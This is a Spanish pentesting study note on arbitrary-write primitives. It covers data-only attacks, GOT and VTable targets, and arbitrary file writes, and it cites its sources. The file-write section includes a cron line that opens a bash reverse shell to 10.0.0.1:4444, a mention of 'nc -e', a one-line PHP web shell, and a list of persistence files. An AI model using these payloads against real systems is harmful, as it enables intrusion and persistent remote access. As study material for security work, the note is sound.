---
tags:
  - Corrupcion-Memoria
  - Pentesting/Explotacion
Descripción: "La primitiva más versátil: escribir un valor elegido en una dirección elegida, y por qué a veces basta con voltear un booleano en vez de ejecutar código"
Fecha de actualización: 2026-08-03
Nota previa: "[[05 - Explotación de heap y VTables]]"
Nota siguiente: "[[07 - Shellcode - de las syscalls al payload]]"
Area: "[[Fuzzing y explotación.base|Fuzzing y explotación]]"
---
---

Una **escritura arbitraria** —poner el valor que quieras en la dirección que quieras— es la primitiva más potente que puedes obtener, y llega por varias vías: un índice sin validar ([[03 - Indexación fuera de límites y expansión de datos]]), un `%n` de format string ([[06 - Format strings e inyección en servicios de red]]), corrupción de metadatos del heap, o un puntero de la aplicación que puedes redirigir.

Lo interesante es que muchas veces **no hace falta ejecutar código** para conseguir lo que quieres.

## La vía barata: subvertir la lógica

```c
struct sesion {
    int socket;
    int es_admin;          // ← 0 para usuarios normales
    char usuario[64];
};

// En otro punto del programa:
if (cmd->tipo == CMD_EJECUTAR && s->es_admin) {
    system(cmd->datos);
}
```

Escribir un `1` en `&s->es_admin` te da la ejecución de comandos que el propio programa ofrece. **Cuatro bytes**, sin *shellcode*, sin ROP, sin pelearse con ASLR, sin DEP de por medio.

<mark style="background: #8000E1A6;">Y lo mejor: ninguna mitigación de las de la lista habitual protege esto</mark>. DEP, ASLR, canarios y CET están todos pensados para impedir que ejecutes **tu** código; ninguno impide que cambies **los datos** del programa. Es la razón de que el *data-only attack* sea una línea de investigación creciente: es la clase de ataque que sobrevive al endurecimiento del control de flujo.

Objetivos típicos de este tipo, en un servicio de red:

| Objetivo | Efecto |
| - | - |
| Bandera de privilegio (`is_admin`, `uid`) | Escalada dentro de la aplicación |
| Bandera de autenticación (`authenticated`) | Bypass de autenticación |
| Longitud o límite de un búfer | Convierte el bug en fuga de información |
| Puntero a la configuración | Cambiar rutas, permisos, destinos |
| Descriptor de fichero de una sesión | Redirigir la salida a un fichero — en Unix, sockets y ficheros son lo mismo |

Ese último es especialmente elegante: si cambias el `socket` de la estructura de sesión por el descriptor de un fichero abierto, **la respuesta del servidor se escribe en el fichero** en vez de en la red. Escritura de fichero sin salir del protocolo.

## La vía clásica: hacia el flujo de ejecución

Cuando lo que quieres es ejecutar código, los objetivos habituales de una escritura arbitraria:

| Objetivo | Estado en 2026 |
| - | - |
| Entrada de la **GOT** | Muerto con **RELRO completo** (por defecto en las distros) |
| Puntero a **VTable** de un objeto | **Vivo**, es el más usado ([[05 - Explotación de heap y VTables]]) |
| Manejadores de `atexit` / `__malloc_hook` | Muertos: eliminados de glibc ≥ 2.34 |
| **Dirección de retorno** en la pila | Vivo si conoces la dirección de la pila |
| Punteros a función de la aplicación | **Vivo** — no hay mitigación genérica |
| Estructuras de `FILE*` (`vtable` de stdio) | Mitigado en glibc, pero con variantes vivas |

La tendencia es clara: **las mitigaciones han ido eliminando los objetivos genéricos de la libc**, y lo que queda son los punteros de la propia aplicación. Que es exactamente lo que en un protocolo propietario abunda: manejadores por comando, *callbacks*, tablas de despacho.

## Escritura arbitraria de ficheros

Cuando la vulnerabilidad no es de memoria sino de recursos — un traversal en una función de subida ([[07 - Canonicalización de rutas y errores verbosos]]) — el objetivo cambia, pero el razonamiento es el mismo: ¿qué fichero, si lo escribo, me da ejecución?

**Con privilegios altos (root / SYSTEM):**

```text
/etc/cron.d/x                    → ejecución periódica
/etc/systemd/system/x.service    → servicio propio
~/.ssh/authorized_keys           → acceso SSH directo
/etc/ld.so.preload               → inyección en TODO proceso nuevo
Sobrescribir un binario o un .so que se vaya a ejecutar
```

```text
* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
```

Ese `crontab` en `/etc/cron.d/` da una *reverse shell* cada minuto y **no necesita permiso de ejecución** en el fichero, a diferencia de dejar un script en `/etc/cron.daily/`. Es el detalle que hace que funcione con una escritura que solo concede permisos de lectura y escritura.

> [!warning]+ El de arriba es el ejemplo del libro y ya no siempre funciona
> `cron` en muchas distribuciones modernas **rechaza ficheros con permisos de escritura para grupo u otros**, y algunas exigen que el fichero pertenezca a `root`. Y `/bin/bash -i >& /dev/tcp/...` solo funciona si bash se compiló con `--enable-net-redirections`, que **Debian y Ubuntu desactivan**. Alternativas portables: un script en Python o Perl, o `nc -e` si está disponible. Comprueba antes de dar el vector por bueno.

**Con privilegios bajos**, se busca algo que otro proceso vaya a leer:

```php
<?php if (isset($_REQUEST['exec'])) { echo system($_REQUEST['exec']); } ?>
```

Escrito en el raíz del servidor web con extensión `.php`, ejecuta como el usuario del servidor. La gracia de PHP aquí es que **no le importa lo que haya alrededor**: busca las etiquetas `<?php ... ?>` en cualquier parte del fichero y ejecuta lo que hay dentro. Eso lo hace ideal cuando no controlas del todo el contenido escrito.

Y en cualquier caso, sin necesidad de ejecución: ficheros de configuración de la propia aplicación, ficheros de sesión, o `.bashrc`/`.profile` del usuario que corre el servicio.

## Cómo pasar de «escribo donde sea» a «escribo donde quiero»

A veces la primitiva es limitada. Tres refinamientos habituales:

1. **Escritura relativa** (`buf[idx]` con `idx` controlado) → arbitraria si `idx` puede ser grande o negativo.
2. **Escritura de un byte** → repetir para construir un valor completo, o **sobrescritura parcial** de un puntero: cambiar solo los 2 bytes bajos de una dirección la mueve dentro de la misma página, y como **ASLR no aleatoriza los bits bajos**, eso funciona sin conocer la dirección base ([[08 - Mitigaciones modernas y cómo se saltan]]).
3. **Escritura de un valor fijo (típicamente cero)** → sigue sirviendo: poner a cero un contador, un límite, una longitud o una bandera de comprobación. Un `authenticated = 0` sobre el flag equivocado también rompe cosas.

> [!important]+ Piensa en datos antes que en código
> Es el error de enfoque más común: en cuanto aparece una primitiva de escritura, la gente va directa a ROP y *shellcode*. Antes de eso, mira **qué datos hay en el proceso que, cambiados, te den lo que buscas**. Es más rápido, más fiable, sobrevive a las mitigaciones y es mucho más fácil de convertir en una prueba de concepto limpia para el informe.

> [!info]+ Fuentes
> - [CWE-123](https://cwe.mitre.org/data/definitions/123.html) — *Write-what-where Condition*.
> - Hu et al., *Data-Oriented Programming: On the Expressiveness of Non-Control Data Attacks* (IEEE S&P 2016) — la formalización de los ataques que solo tocan datos.
> - [glibc — eliminación de `__malloc_hook` y `__free_hook`](https://sourceware.org/glibc/wiki/MallocInternals) en 2.34.
> - Forshaw, *Attacking Network Protocols*, cap. 10, «Arbitrary Memory Write Vulnerability».
